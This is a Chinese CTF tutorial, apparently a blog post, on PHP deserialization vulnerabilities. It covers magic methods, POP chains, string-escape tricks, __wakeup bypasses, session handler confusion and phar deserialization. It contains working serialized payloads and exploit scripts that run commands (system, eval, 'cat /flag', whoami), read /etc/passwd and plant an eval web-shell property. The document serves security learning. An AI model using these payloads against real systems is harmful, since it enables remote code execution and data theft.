@[TOC]

# 序列化
## 简介

> 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。可以理解为一种编码方式。
序列化的目的是将数据转换为可传输或可存储的形式，使其能够在不同的平台、操作系统或编程语言之间进行交互，而不会损失原始数据的结构和内容。通过序列化，数据可以被编码成字节流，然后在需要时可以进行反序列化恢复为原始的数据结构或对象。

## 类型
### 简单数据类型

> 空字符 NULL --> N;
> 整型 1145 --> i:1145;
> 浮点型 114.5 --> d:114.5;
> 布尔型 true --> b:1;     false --> b:0;
> 字符串 'yuanshen' --> s:8(长度):"yuanshen";

### 数组

> array('ys','mihoyo') --> a(array):3(参数数量):{i:0(下标/键名);s:2:"ys";i:1;s:6:"mihoyo";}

### 对象

变量为public：

```php
class test{
      public $pub='yuanshen';
      }
```

> O:4:"test":1:{s:3:"pub";s:8:"yuanshen";}
> 即O(object):类名长度:"类名“:变量(键)数量:{s:键名的长度:"键名";s:键值的长度:"键值";}

变量为private：

```php
class test{
      private $pub='yuanshen';
      }
```

> O:4:"test":1:{s:5:"pub";s:8:"yuanshen";}
> 即O(object):类名长度:"类名“:变量(键)数量:{s:键名的长度`+2`:"键名";s:键值的长度:"键值";}

> 为什么+2：
> private私有属性序列化时，在键名前后会加空字符(%00)，即%00键名%00
> 注意：所以有时再反序列化生成POC时会加一个urlencode，即urlencode(serialize($a)）

变量为protected：
```php
class test{
      protected $pub='yuanshen';
      }
```

> O:4:"test":1:{s:6:"\*pub";s:8:"yuanshen";}
> 即O(object):类名长度:"类名“:变量(键)数量:{s:键名的长度`+3`:"`*`键名";s:键值的长度:"键值";}

> 为什么+3：
> protected属性序列化时，在键名前会加空字符(%00) \* 空字符(%00)，即%00 \* %00键名

### 嵌套对象(对象套对象)

```php
class test{
      public $pub='ys';
      }
class test2{
      public $mihoyo;
      }
$b=new test();
$a=new test2();
$a->mihoyo=$b;
echo serialize($a);
# a类中套b类，序列化a类
```

> O:5:"test2":1:{s:6:"mihoyo";O:4:"test:1:{s:3:"pub";s:2:"ys";}}
> 即O(object):(主)类名长度:"(主)类名“:(主)变量(键)数量:{s:(主)键名的长度:"(主)键名";O(object):(分)类名长度:"(分)类名“:(分)变量(键)数量:{s:(分)键名的长度:"(分)键名";s:(分)键值的长度:"(分)键值";}}


# 反序列化扫盲

> 反序列化后的内容为对象；
> `反序列化生成的对象的值由序列化的值提供，与原有类预定义的值无关;`
> 反序列化默认不触发类的成员方法 (魔术方法除外)；
> `修改掉序列化的变量值后调用原对象的函数，反序列化时仍能调用到原对象的目标函数，使用的参数是修改后的变量。`可以类比子类调用父类函数理解;

# 反序列化漏洞
## 漏洞成因
反序列化过程中，unserialize()接收的值可控，通过更改该值，得到所需的代码(即生成的对象的敏感属性值)

## 简单复现

```php
  class test{
        public $ys='ys';
        public function display(){
               eval($this->ys);
               }
        }
  $payload=$_GET["cmd"];
  $b=unserialize($payload);
  $b->display();
```

> 假设我想执行system("ls");命令，即让\$b中的\$ys='system("ls");'，我们只要构造出该命令的序列化形式传参给cmd即可。将造的payload：O:4:"test":1{s:2:"ys";s:13:"system("ls");"}传参给cmd即可执行eval(system("ls");）


# 魔术方法
## __construct
构造函数：在实例化对象时会自动执行的魔术方法，可类比c++的构造函数理解。
触发时机：实例化对象时，即new一个对象时
注意：`在序列化和反序列化时不触发，仅new时触发`

## __destruct
析构函数：在对象所有的引用被删除或者当对象被显式销毁时执行，可类比c++
触发时机：`反序列化后会触发`，序列化不触发(因为反序列化得到的是对象)
例子：

```php
<?php 
class User{
    public function __destruct(){
        echo "析构";
    }
}
$test=new User();
$ser=serialize($test);
unserialize($ser);
?>
```

> 该段代码共执行两次析构函数，一次是销毁\$test前，一次是销毁反序列化得到的对象前

## __sleep
__sleep：序列化函数serialize函数会检查类中是否有__sleep魔术方法，存在则先被调用，再执行序列化。
功能：序列化之前触发，用于清理不必要的属性，返回需要被序列化存储的成员属性。
触发时机：`serialize()执行前`
参数(可选)：成员属性
注意：如果该方法设定不返回任何内容，则后续NULL被序列化，并产生一个E_NOTICE级别的错误。
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/3f4116d6a4be4851a37dee8bb769fa0a.png)
## __wakeup
__wakeup：在反序列化之前，unserialize()会检查是否有__wakeup，有则先调用，再反序列化。
作用：反序列化前预先准备对象需要的资源，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。
触发时机：`反序列化serialize前`

> 出题手段：常在wakeup写赋值语句将目标参数初始化，从而打断反序列化漏洞的利用。

## __toString
触发时机：`把对象当成字符串调用就会触发`
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/2c36b9734dd34033812939ae0d283a90.png)

错将对象当作字符串使用，触发了__toString方法。
当然, 因为 PHP 是一个弱类型语言, 很多情况对象会被隐式转换成字符串, 比如说

- `==` 与字符串比较时会被隐式转换
- 字符串操作 (str系列函数), 字符串拼接, `addslashes`
- 一些参数需要为字符串的参数: `class_exists` , `in_array`(第一个参数), SQL 预编译语句, `md5`, `sha1`等
- `print`, `echo` 函数

> 补充：
> 调用对象：print_r，var_dump
> 输出字符串：echo，print

## __invoke
触发时机：`将对象当成函数调用时触发`
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/303a6cce995346b5b5083f4b0d7692b0.png)
\$user1()将对象当作函数使用，触发了__invoke方法

## 与错误调用有关的其他
### __call
触发时机：`调用不存在的方法(成员函数)时`
参数：\$name：表示被调用的方法名（字符串类型）；\$arguments：表示被调用的方法传递的参数（数组类型）
返回值：根据选择，自定义
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/bb2c0080f00b47b1920d8ae27a911e8a.png)
调用了test对象中没有的函数mihoyo()，触发了__call方法。

### __callStatic
触发时机：`静态调用的方法不存在时触发`

> 静态调用：使用类名和双冒号(::)来调用类的静态方法或访问类的静态属性。静态调用`不需要实例化类对象`，直接通过类名进行调用。

参数：同__call方法
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/ba95ac96ad3d4a5d9997255ae0662d51.png)

### __get
触发时机：`调用的成员属性不存在时`
参数：错误的成员属性名(字符串)
例子：0
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/30faaecc36bf4672972df9150182fb62.png)

### __set
触发时机：`给不存在或无法(无权)访问的成员属性赋值`
作用：常用来设置私有属性
参数：\$name：指定要设置的属性名称(字符串)；\$value：指定要为属性设置的值(任意类型)
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/73a30fb3c2934ea1a14919f808afbcb5.png)

### __isset/__empty
作用：用于检测不存在或不可访问的属性是否被赋了值
触发时机：`对不可访问或不存在的属性使用时即可触发`
参数：要检测的属性名
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/77801e256fe740edb7b22bcc3f1bed09.png)
直接访问私有属性var，触发__isset方法

### __unset
触发时机：`对不可访问的属性使用unset()时`
功能：常用于在删除一个不可访问的属性时进行特殊处理。
参数：不可访问的属性名
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/e52fd7b5a1c94746be9107a2c34a06ae.png)

### __clone
触发时机：`使用clone关键字拷贝完成一个对象后，新对象会自动调用`
例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/591fe0e970db4818a890a9c83a4025a5.png)
## 总结
![在这里插入图片描述](https://img-blog.csdnimg.cn/fd3dcb79b47548a8b9d7d8ac4b14e4c8.jpeg)
![在这里插入图片描述](https://img-blog.csdnimg.cn/7707fd63c4ee4e6cb131055a109dafc9.jpeg)
# pop链扫盲
## 反推法
反推法：由于类之间的关系常常十分复杂，正推不太现实，所以需要从突破口开始反推解题。
来看例题：

```php
<?php
class index{
    private $test;
    public function __construct(){
        $this->test=new normal();
    }
    public function __destruct(){
        $this->test->action();
}
}
class normal{
    public function action(){
        echo "no hack";
    }
}
class evil {
    public $test2;
    public function action(){
        eval($this->test2);
    }
}
unserialize($_GET['x']);
?>
```

> 分析一下代码：
> 定义了三个类：index,normal,evil；
> 1、index含有construct和destruct方法，construct将自身属性\$test实例化成了normal对象，destruct调用action函数；
> 2、normal类中定义了它的action函数，但是是fake；
> 3、evil类定义了它的action函数，其中包括了一个可控的eval函数，是本题的`突破口`
> 最后对我们传的参数x反序列化

接着从突破口反推
> 1、要想执行eval函数，必须在evil类下执行action函数
> 2、整个代码中只有第8行调用了action函数，所以要能执行index类中的析构方法
> 3、析构函数中的语句是\$this->test->action()，所以我们的目标就是让\$test变量是一个evil对象
> 4、而在\$test的初值是由构造函数指定的，是一个normal对象，所以我们现在要让它是evil对象
> 5、 __ destruct在反序列化后执行，所以我们只要传参一个evil类格式的包含payload的序列化的值，就会按evil对象形式反序列化出evil对象
> 6、综上我们的序列化payload即内层是evil形式，外层是index形式

想清思路后在题目代码的基础上写脚本构造payload：

```php
<?php
class index{
    private $test;
    public function __construct(){
        $this->test=new evil();
    }
    #public function __destruct(){
    #    $this->test->action();
#}
}
#class normal{
 #   public function action(){
  #      echo "no hack";
   # }
#}
class evil {
    public $test2="phpinfo();";
    #public function action(){
     #   eval($this->test2);
    #}
}
$a=new index();
echo serialize($a);
?>
```

得到payload：
> O:5:"index":1:{s:4:"test";O:4:"evil":1:{s:5:"test2";s:10:"phpinfo();";}}

![在这里插入图片描述](https://img-blog.csdnimg.cn/384ee3f9478e435ba95142b8fc510c56.png)

## POP链
POP链：property oriented programming，面向属性编程。pop链即利用可控的对象属性值通过魔术方法，在代码间多次跳转，最后获取敏感数据的payload。
例题：

```php
<?php
//flag is in flag.php
error_reporting(0);
class Modifier {
    private $var;
    public function append($value){
        include($value);
        echo $flag;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
class Show {
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}
class Test {
    public $p;
    public function __get($key){
        $function=$this->p;
        return $function();
    }
}
$pop='';
unserialize($pop);
?>
```
代码结构：
![在这里插入图片描述](https://img-blog.csdnimg.cn/bd335fc24b3b4c53b6cc8eb743f5afcc.png)
发现突破口在include函数，使它包含flag.php，接着一步步触发魔术方法，思路：
![在这里插入图片描述](https://img-blog.csdnimg.cn/04d0940e3b07476384c3f74d56181167.jpeg)
写代码构造payload：

> 先写大致框架：
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/ee6a3f715bca4d3db2ad8afe861f052d.png)
> 接着按pop链逆向赋值：
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/70bb032fac6e471999d102c65cdd59e0.png)
拿到payload，即题目中\$pop的值

# 字符串逃逸

> 属性逃逸（property escape）指的是在对象外部直接访问和修改对象的属性，绕过了对象的封装性和访问控制。

> 在序列化和反序列化之间，如果序列化字符串增加或者减少，可能造成反序列化时的属性逃逸。

## 相关特性
### 分隔符特性

> 反序列化，在前面字符串没有问题时，以;}结束，后面的字符串不影响正常的反序列化。

![在这里插入图片描述](https://img-blog.csdnimg.cn/ee64c4872c874d8db60e92702da6b655.png)

### 属性增加特性
![在这里插入图片描述](https://img-blog.csdnimg.cn/168c3d96180040d6a7f7dd8a63ff64e1.png)

> 给序列化字符串增加属性，只要记得改掉成员属性数量，即可成功反序列化


## 减少逃逸
常见触发函数：preg_replace()，str_replace()
例子：

> 目标：逃逸出一个v3属性，值为123

![在这里插入图片描述](https://img-blog.csdnimg.cn/c881403190504e34951432cf9a275020.jpeg)

![在这里插入图片描述](https://img-blog.csdnimg.cn/05ade16e4f464f659014586c757dd7a8.png)

> 核心思路：序列化字符串中的成员属性个数是限定死的2个，不能增加，所以我们要利用上例中的“11”去把\$v2吃掉(含入\$v1的键值字符串中)，这样我们的\$v3就合法了

> 被替换字符system()就像是用来撑开v1的，撑开之后就会消失，用撑开的地方去吃v2

构造过程(逆推法)：
 
> 1、目标参加反序列化的字符串：
> O:1:"A":2:{s:2:"v1";s:?:"abc";s:2:"v2";s:?:"`";s:2:"v3";s:3:"123`";}
2、标红为传参v2的值。接着考虑v1吃v2，使v3逃逸：
![在这里插入图片描述](https://img-blog.csdnimg.cn/e9c2708585f9422aa20518e81751a764.png)
3、标蓝为吃掉v2后v1的值，这也就解释了为什么v2的值是";开头，"是闭合s:?:"处的前引号，;是格式要求的分隔符，这样构造就使得逃逸后的字符串合法了。
4、接着确定两个?的值(从后向前)：
（1）v2值的长度是19，所以第二个?写19。当前字符串：
 O:1:"A":2:{s:2:"v1";s:?:"`abc";s:2:"v2";s:19:"`";s:2:"v3";s:3:"123";}
（2）所以达成逃逸时，v1的值需要变为标红所示，所以v1的长度应该是20，即第二个?是20
5、接着逆推到用system()撑开v1：目标是撑到20的大小，而v1的大小必须是3+8n，即abc+n个system()，n取大不取小，取n=3，那么v1的大小就是27了，为了不影响后方的逃逸，后面也需要调整
6、当前： O:1:"A":2:{s:2:"v1";s:27:"`abc";s:2:"v2";s:19:"";s:2:"`v3";s:3:"123";}
很明显需要调整，而我们可控的只有v2，所以只要给v2填充27-20个字符即可。当然为了不影响语法，要注意位置。
修改为： O:1:"A":2:{s:2:"v1";s:27:"`abc";s:2:"v2";s:19:"1234567`";s:2:"v3";s:3:"123";}
7、综上，传的参数：v1为`abcsystem()system()system()`，v2为`1234567”;s:2:“v3”;s:3:“123”;}`

![在这里插入图片描述](https://img-blog.csdnimg.cn/d7f7d325bfeb435bb3242c3dd7c7ffff.png)
成功逃逸。


## 增多逃逸
类比减少逃逸:

> 减少：多逃逸一个成员属性。第一个字符串减少，以吃掉有效代码，在第二个字符串构造目标逃逸代码。
> 增多：构造出一个逃逸成员属性。第一个字符串增多，吐出多余代码，把多余位置构造成目标逃逸代码。

例子：

> 目标：逃逸出v3=666

![在这里插入图片描述](https://img-blog.csdnimg.cn/78812b0b94de45648059625e49cc89db.jpeg)

> 思路：
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/9d143fa4f7e146d58553960d45268901.png)

> 所以最终只用给v1传参ls...ls(11个)";s:2:"v3";s:3:"666";}即可成功逃逸：
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/c735847e623c4d2a951da8463941f0d0.png)

## 增多例题
![在这里插入图片描述](https://img-blog.csdnimg.cn/42a2809eb9814f76b5b4c089fa51c8e4.png)

> 目标是修改不能修改的属性值，另一属性值可控；
> 且存在字符串的增多(php->hack);
> 判断为字符串增多逃逸

字符串构造：
![在这里插入图片描述](https://img-blog.csdnimg.cn/5533569afe414cccb2615b203c091dfc.jpeg)
所以最终payload：param=php...php(29个)";s:4:"pass";s:8:"escaping";}


## 减少例题
![在这里插入图片描述](https://img-blog.csdnimg.cn/278f1f4f41a84bef9859221eff6c5e5d.png)
> 目标是修改不能修改的属性值，另外两个属性值可控；
> 且存在字符串的减少(flag->hk);
> 判断为字符串减少逃逸

思路：

> ![在这里插入图片描述](https://img-blog.csdnimg.cn/8ac9431100d1465384f23a41edce872e.png)

> 目标参数值：
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/c382d3549593494f971e390b73c64ce3.png)

> 序列化字符串：
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/af7beedb31e74d82bc800ba965217d98.png)
经过反序列化后，成功逃逸出vip=true


# 常见绕过姿势
## 绕过wakeup方法
### CVE-2016
> CVE-2016-7124：即wakeup绕过漏洞，若序列化字符串中真实属性个数<标定个数时，会跳过_wakeup
> 版本限制：PHP5<5.6.25 / PHP7<7.0.10
> 如：O:4"test":2:{s:2:"ys";}


### php引用赋值&

在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。

比如：

```
<?php
function test (&$a){
    $x=&$a;
    $x='123';
}
$a='11';
test($a);
echo $a;
```

输出:

```
123
```

可以看到这里我们虽然最初$a=’11’，但由于我们通过$x=&$a使两个变量同时指向同一个内存地址了，所以使$x=’123’也导致$a=’123’了。

举个例子：

```
<?php

class KeyPort{
    public $key;

    public function __destruct()
    {
        $this->key=False;
        if(!isset($this->wakeup)||!$this->wakeup){
            echo "You get it!";
        }
    }

    public function __wakeup(){
        $this->wakeup=True;
    }

}

if(isset($_POST['pop'])){

    @unserialize($_POST['pop']);

}
```

可以看到如果我们想触发echo必须首先满足:

```
if(!isset($this->wakeup)||!$this->wakeup)
```

也就是说要么不给wakeup赋值，让它接受不到`$this->wakeup`，要么控制wakeup为false，但我们注意到`KeyPort::__wakeup()`，这里使`$this->wakeup=True;`，我们知道在用unserialize()反序列化字符串时，会先触发`__wakeup()`，然后再进行反序列化，所以相当于我们刚进行反序列化`$this->wakeup`就等于True了，这就没办法达到我们控制wake为false的想法了

因此这里的难点其实就是这个`wakeup()`绕过，我们可以使用上面提到过的引用赋值的方法以此将wakeup和key的值进行引用，让key的值改变的时候也改变wakeup的值即可

```
<?php

class KeyPort{
    public $key;

    public function __destruct()
    {
    }

}

$keyport = new KeyPort();
$keyport->key=&$keyport->wakeup;
echo serialize($keyport); 
#O:7:"KeyPort":2:{s:3:"key";N;s:6:"wakeup";R:2;}
```

### Fast_destruct
见下文提前GC回收
#### eg

引用一下大佬的解释：

- 在PHP中如果单独执行`unserialize()`函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行`__destruct()`方法
- 而如果将`unserialize()`函数执行后得到的字符串赋值给了一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行析构方法

我们可以看到DASCTF X GFCTF 2022十月挑战赛里EasyPOP这道题，源码是：

```
<?php
highlight_file(__FILE__);
error_reporting(0);

class fine
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        call_user_func($this->cmd, $this->content);
    }

    public function __wakeup()
    {
        $this->cmd = "";
        die("Go listen to Jay Chou's secret-code! Really nice");
    }
}

class show
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }


    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: " . $this->time;
    }


}

class sorry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }

    public function __sleep()
    {
        $this->hint = new secret_code();
    }

    public function __get($name)
    {
        $name = $this->key;
        $name();
    }


    public function __destruct()
    {
        if ($this->password == $this->name) {

            echo $this->hint;
        } else if ($this->name = "jay") {
            secret_code::secret();
        } else {
            echo "This is our code";
        }
    }


    public function getPassword()
    {
        return $this->password;
    }

    public function setPassword($password): void
    {
        $this->password = $password;
    }


}

class secret_code
{
    protected $code;

    public static function secret()
    {
        include_once "hint.php";
        hint();
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this->$num();
    }

    private function show()
    {
        return $this->code->secret;
    }
}


if (isset($_GET['pop'])) {
    $a = unserialize($_GET['pop']);
    $a->setPassword(md5(mt_rand()));
} else {
    $a = new show("Ctfer");
    echo $a->show();
}
```

可以看到这里有个难点就是wakeup的绕过：

```
    public function __wakeup()
    {
        $this->cmd = "";
        die("Go listen to Jay Chou's secret-code! Really nice");
    }
```

exp:

```
<?php
class sorry
{
   public $name;
    public $password;
    public $key;
    public $hint;
}

class show
{
    public $ctf;

}
class secret_code
{
    public $code;
}

class fine
{
    public $cmd;
    public $content;
    public function __construct()
    {
        $this->cmd = 'system';
        $this->content = ' /';
    }
}

$a=new sorry();
$b=new show();
$c=new secret_code();
$d=new fine();
$a->hint=$b;
$b->ctf=$c;
$e=new sorry();
$e->hint=$d;
$c->code=$e;
$e->key=$d;
echo (serialize($a));
#O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";N;s:4:"hint";O:4:"show":1:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";O:4:"fine":2:{s:3:"cmd";s:6:"system";s:7:"content";s:2:" /";}s:4:"hint";r:10;}}}}
```

直接传进去毫无疑问会因为die()而终止，这里我们就可以用fast-destruct这个技巧使destruct提前发生以绕过wakeup()，比如我们可以减少一个} ：

```
?pop=O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";N;s:4:"hint";O:4:"show":1:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";O:4:"fine":2:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}s:4:"hint";r:10;}}}
```

或者在r;10;后面加一个1：

```
?pop=O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";N;s:4:"hint";O:4:"show":1:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";O:4:"fine":2:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}s:4:"hint";r:10;1}}}}
```

都可以实现wakeup绕过


###   php issue#9618


The following code:  以下代码：

```php
<?php

class A
{
    public $info;
    private $end = "1";

    public function __destruct()
    {
        $this->info->func();
    }
}

class B
{
    public $end;

    public function __wakeup()
    {
        $this->end = "exit();";
        echo '__wakeup';
    }

    public function __call($method, $args)
    {
        eval('echo "aaaa";' . $this->end . 'echo "bbb"');
    }
}

unserialize($_POST['data']);
```

我发现了一个有趣的 bug。当反序列化字符串包含错误字符串长度的变量时，反序列化继续，但__destruct（）函数会在调用__wakeup 之前被调用。这样你可以绕过__wakeup（）。


- 7.4.x -7.4.30
- 8.0.x

`[POST]data=O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:6:"Aend";s:1:"1";}  `


This event also is triggered when  
该事件也在以下情况下触发

- delete )  删除 ）
- Inconsistent number of class attributes  
    类别属性数量不一致
- The length of the attribute key does not match.  
    属性键的长度不匹配。
- The length of the attribute value does not match.  
    属性值的长度不匹配。
- delete ;  删除;




### 使用C绕过

O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会被自动调用。

```
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }

}

$data = $_GET['1+1>2'];

if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}


?>
```

```
<?php
class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }

} 
$a=new ctfshow();
echo serialize($a);
#O:7:"ctfshow":0:{}
```
我们把O改成C传入C:7:”ctfshow”:0:{}可以看到网页显示bypass

但你只能这么传入，稍微改一点就没反应了，更别说向里面传值了，这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头(官方文档说：This class allows objects to work as arrays.)这个类允许把一个数组当作一个对象来调用。

```
<?php

class ctfshow {
    public $ctfshow;

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        echo "OK";
        system($this->ctfshow);
    }
     

}
$a=new ctfshow;
$a->ctfshow="whoami";
$arr=array("evil"=>$a);
$oa=new ArrayObject($arr);
$res=serialize($oa);
echo $res;
//unserialize($res)
?>
#C:11:"ArrayObject":77:{x:i:0;a:1:{s:4:"evil";O:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}};m:a:0:{}}
```

最后成功命令执行



## 引用绕过相等

> 序列化中的引用特性：
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/6589a48e759b4482b99556f377ff3cd0.png)
另外：
1、由于serialize函数总默认把被引用的属性放到{}中的第一个位置，所以一般都是R:2
2、注意逻辑关系(谁是谁的引用)，&不要加错位置

例题：
![在这里插入图片描述](https://img-blog.csdnimg.cn/eed4bb858a0b4d689e33975b5364e99c.png)

> 思路：利用引用，让enter成为secret的引用，所以当反序列化后给secret赋值为\*时，enter也就赋值为了\*
payload：O:8:"just4fun":2:{s:6:"secret";s:5:"enter";N;R:2}

## 十六进制绕过关键字

> 在反序列化时，序列化中的十六进制会被转化成字母
> \00 会被替换为 %00
\65 会被替换为 e
所以：可以使用十六进制以绕过关键字过滤

##  利用好引用

对于需要判断两个变量是否相等时, 我们可以考虑使用引用来让两个变量始终相等.

这个相当于一个指针一样, 代码如下:

```php
class A {
    public $a;
    public $b;    
}

$a = new A();
$a->a = &$a->b;
echo serialize($a);
```

序列化后的结果为:

```css
O:1:"A":2:{s:1:"a";N;s:1:"b";R:2;}
```
这个R：2指向的是序列化后的第二个字段
1为“A”  2为“a”  3为“b”


## 对象反序列化正则绕过

有些时候我们会看到`^O:\d+` 这种的正则表达式, 要求开头不能为对象反序列化

这种情况我们有以下绕过手段

1. 由于`\d`只判断了是否为数字, 则可以在个数前添加`+`号来绕过正则表达式
2. 将这个对象嵌套在其他类型的反序列化之中, 例如数组

当然, 第一种更佳. 因为若不只匹配开头则仍可以绕过

### 利用不完整类使再次序列化结果变化

当存在 `serialize(unserialize($x)) != $x` 这种很神奇的东西时, 我们可以利用不完整类 `__PHP_Incomplete_Class` 来进行处理

当我们尝试反序列化到一个不存在的类是, PHP 会使用 `__PHP_Incomplete_Class_Name` 这个追加的字段来进行存储

我们于是可以尝试自己构造一个不完整类

```php
<?php
$raw = 'O:1:"A":2:{s:1:"a";s:1:"b";s:27:"__PHP_Incomplete_Class_Name";s:1:"F";}';
$exp = 'O:1:"F":1:{s:1:"a";s:1:"b";}';
var_dump(serialize(unserialize($raw)) == $exp); // true
```

这样就可以绕过了

更近一步, 我们可以通过这个让一个对象被调用后凭空消失, 只需要手动构造无`__PHP_Incomplete_Class_Name`的不完整对象

PHP 会先把他的属性给创建好, 但是在创建好最后一个属性后并未发现 `__PHP_Incomplete_Class_Name`, 于是会将前面创建的所有的属性回收并引发 `__destruct`

当然, 要达成这种在反序列化后的变量还存在的时候引发 `destruct`, 还有下面这一种方法

### Fast Destruct (提前 GC 回收)

还有一种叫做 `fast destruct` 的神奇操作, 通常是在反序列化之后 throw 了一个 Exception 导致没有正常进入回收的逻辑. 同样也是为了在序列化过程中, 在已经创建好了属性的对象之后引发反序列化错误, 导致全部属性被回收而 `destruct`, 这种手法要比上一种简单一点点:

- 改变序列化的元素数字个数 (往小的写)
- 删掉最后一个`}` (这是什么爽的操作)

> 这个可以参考 `强网杯 2021 WhereIsUWebShell`, 可以去看看其他师傅的解法, 我在看的时候看到了很多奇特的绕过手法.



# session反序列化漏洞
前置知识：

> 1、session的存储：当调用session_start()或php.ini中的session.auto_start=1时，php会将访问用户的session序列化后存储在指定目录(默认为/tmp)。

>主要存取格式：
>![在这里插入图片描述](https://img-blog.csdnimg.cn/07a68566a6654c93962f390e3b9202d2.png)
声明格式的语句：ini_set('session.serialize_handler','处理器')


漏洞详情：

>2、漏洞成因：session的存储格式和读取格式不同，利用"误会"执行恶意代码
3、使用时机：一个页面存储，一个页面读取，且格式类型不同

例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/f32235d9a2534dd7b89985d0ce78f64f.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/e7b3995f55ae4d3180eb91bcf09db959.png)

审一下代码，着手点在D类中的析构函数下的eval函数，目标即给a赋值为恶意代码。

> 特性：同一目录下，一个文件session_start()并存储了一个session，那么访问另一个使用session_start()的文件会对第一个文件的session反序列化

> 思路：提交?a=|O:1:"D":1:{s:1:"a";s:10:"phpinfo();";}这个字符串
> 经过php_serialize存储后是a:1:{s:3:"ben";s:39:"`|O:1:"D":1:{s:1:"a";s:10:"phpinfo();";}`"}
再到另一页面以php格式读取：此时按照php格式读取，会从管道符|开始读取，即前面的作废，只反序列化出我们构造的D对象，以成功执行eval函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/dde648465ffd4abebec6cd23dfded70d.png)



## php>7.1版本对类的属性检测不严格


**在PHP<7.1版本中必须使用私有属性filename才可以对以上类进行反序列化，例如：**

```php
<?php   
class BUU {  
    // 注意这里是私有属性反序列化与题目的一致  
    private $filename = '/etc/passwd';  
}  
echo urlencode(serialize(new BUU));  
// O%3A3%3A%22BUU%22%3A1%3A%7Bs%3A13%3A%22%00BUU%00filename%22%3Bs%3A11%3A%22%2Fetc%2Fpasswd%22%3B%7D  
?>
```

**在PHP>7.1版本中可以使用其他访问权限反序列化私有属性filename，例如：**
```php
<?php   
class BUU {  
    // 注意这里是私有属性反序列化与题目的一致  
    public $filename = '/etc/passwd';  
}  
echo serialize(new BUU); // O:3:"BUU":1:{s:8:"filename";s:11:"/etc/passwd";}  
?>
```

# phar反序列化漏洞
## 简介
> phar：类似JAR的打包文件，php>5.3默认支持
> 利用：配合文件上传、文件包含、phar伪协议读取
![在这里插入图片描述](https://img-blog.csdnimg.cn/c83d11f0bc0249868fccc1eec6da313b.png)

1、漏洞原理：manifest以序列化存储信息，用phar伪协议解析.phar文件时会触发自动反序列化。
2、条件：php>=5.2；phar.readonly=off
3、部分触发函数：
![在这里插入图片描述](https://img-blog.csdnimg.cn/d36485ae6e9f4a32a358925d646a97fc.png)

## 使用情况
（1）phar文件可上传
（2）有可用的魔术方法作为跳板，以执行漏洞函数
（3）存在文件操作函数(可触发函数)
（4）文件操作参数可控

> 注意：`.phar文件无关后缀`，例如将1.phar改为1.png没有影响

## 生成phar文件的脚本
根据题目具体题目修改#注释处
```php
<?php
class Testobj  #根据题目修改类名
{
    public $output='';  #若有属性，则自己修改
}

@unlink('test.phar');  //删除之前的test.phar(有的话)
$phar=new Phar('test.phar');  //创建phar对象
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __halt_compiler(); ?>');  //写入stub
$o=new Testobj();  #根据名字修改
$o->output='eval($_GET["a"]);'; #根据题目设置成员属性
$phar->setMetadata($o);  //写入meta-data
